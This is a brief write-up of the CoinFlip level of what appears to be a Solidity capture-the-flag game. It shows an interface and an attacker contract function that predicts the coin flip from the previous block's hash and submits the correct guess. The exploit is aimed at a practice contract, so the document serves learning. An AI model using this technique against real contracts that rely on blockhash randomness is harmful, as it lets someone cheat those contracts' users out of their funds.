# CoinFlip

I guess the purpose of this one was to teach the use of interfaces to interact with other contracts

You can make an interface with the function definition that you want to call

```sol
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

And just make a function in your own contract with the Addr of the deployed contract (contract.address)

```sol
function flipGuess() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    ICoinFlip(<addr_deployed_contract>).flip(side);
}
```
